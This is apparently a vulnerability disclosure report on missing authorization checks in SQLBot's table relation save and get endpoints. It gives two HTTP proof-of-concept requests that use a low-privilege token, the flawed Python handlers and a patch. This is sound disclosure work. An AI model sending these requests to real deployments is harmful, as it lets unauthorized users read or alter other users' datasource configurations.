# Missing Authorization in Table Relation Management APIs

## 1. Vulnerability Title
Missing Authorization Check in Table Relation Management APIs of SQLBot

## 2. Product Details
* **Vendor:** SQLBot Team
* **Product:** SQLBot
* **Affected Version(s):** <= v1.3.0
* **Fixed Version:** N/A

## 3. Vulnerability Type (CWE)
* **CWE ID:** CWE-285 (Improper Authorization)
* **Type Name:** Broken Function Level Authorization (BFLA)

## 4. Description (Crucial for CVE Entry)
SQLBot version 1.3.0 and earlier contains missing authorization vulnerabilities in the Table Relation Management APIs, allowing any authenticated user to save and retrieve table relation configurations for any datasource without proper authorization checks.

## 5. Impact
* **Impact Description:** An authenticated attacker with low privileges can:
  - Retrieve table relation configurations from any datasource
  - Modify table relation configurations of any datasource, potentially disrupting query generation
* **Attack Vector:** Network (Remote)
* **Privileges Required:** Low (Any authenticated user)

## 7. Proof of Concept (PoC) / Steps to Reproduce

### Prerequisites
1. Deploy SQLBot application
2. Login as a low-privileged user and obtain a valid `x-sqlbot-token`

### PoC 1: Save Table Relation (POST /table_relation/save/{ds_id})

```http
POST /api/v1/table_relation/save/1 HTTP/1.1
Host: target-server
Content-Type: application/json
x-sqlbot-token: <valid_user_token>

[
    {
        "source_table": "users",
        "source_field": "id",
        "target_table": "orders",
        "target_field": "user_id",
        "relation_type": "one_to_many"
    }
]
```

**Result:** Successfully saves table relation without authorization check.

### PoC 2: Get Table Relation (POST /table_relation/get/{ds_id})

```http
POST /api/v1/table_relation/get/1 HTTP/1.1
Host: target-server
x-sqlbot-token: <valid_user_token>
```

**Result:** Returns table relation configuration without authorization check.

## 8. Vulnerable Code Location

**File:** `backend/apps/datasource/api/table_relation.py`

| Endpoint | Method | Lines | Description |
|----------|--------|-------|-------------|
| /table_relation/save/{ds_id} | POST | 13-21 | Save table relation |
| /table_relation/get/{ds_id} | POST | 24-29 | Get table relation |

### Vulnerable Code: Save Relation (Lines 13-21)

```python
@router.post("/save/{ds_id}")
async def save_relation(session: SessionDep, ds_id: int, relation: List[dict]):
    # Missing: current_user: CurrentUser parameter
    # Missing: Authorization check
    ds = session.get(CoreDatasource, ds_id)
    if ds:
        ds.table_relation = relation
        session.commit()
    else:
        raise Exception("no datasource")
    return True
```

### Vulnerable Code: Get Relation (Lines 24-29)

```python
@router.post("/get/{ds_id}")
async def save_relation(session: SessionDep, ds_id: int):
    # Missing: current_user: CurrentUser parameter
    # Missing: Authorization check
    ds = session.get(CoreDatasource, ds_id)
    if ds:
        return ds.table_relation if ds.table_relation else []
    return []
```

## 9. Remediation

Add proper authorization checks to all affected endpoints:

```python
from common.core.deps import CurrentUser, Trans

@router.post("/save/{ds_id}")
async def save_relation(session: SessionDep, current_user: CurrentUser, trans: Trans, ds_id: int, relation: List[dict]):
    if not current_user.isAdmin and current_user.weight == 0:
        raise Exception(trans('i18n_permission.no_permission', url='', msg=''))
    ds = session.get(CoreDatasource, ds_id)
    # Verify user has access to this datasource
    if ds.oid != current_user.oid and not current_user.isAdmin:
        raise Exception(trans('i18n_permission.no_permission', url='', msg=''))
    # ... rest of the code

@router.post("/get/{ds_id}")
async def get_relation(session: SessionDep, current_user: CurrentUser, trans: Trans, ds_id: int):
    ds = session.get(CoreDatasource, ds_id)
    # Verify user has access to this datasource
    if ds.oid != current_user.oid and not current_user.isAdmin:
        raise Exception(trans('i18n_permission.no_permission', url='', msg=''))
    # ... rest of the code
```

## 10. Summary Table

| Endpoint | Method | Severity | Impact |
|----------|--------|----------|--------|
| /table_relation/save/{ds_id} | POST | High | Save table relation config |
| /table_relation/get/{ds_id} | POST | Medium | Get table relation config |
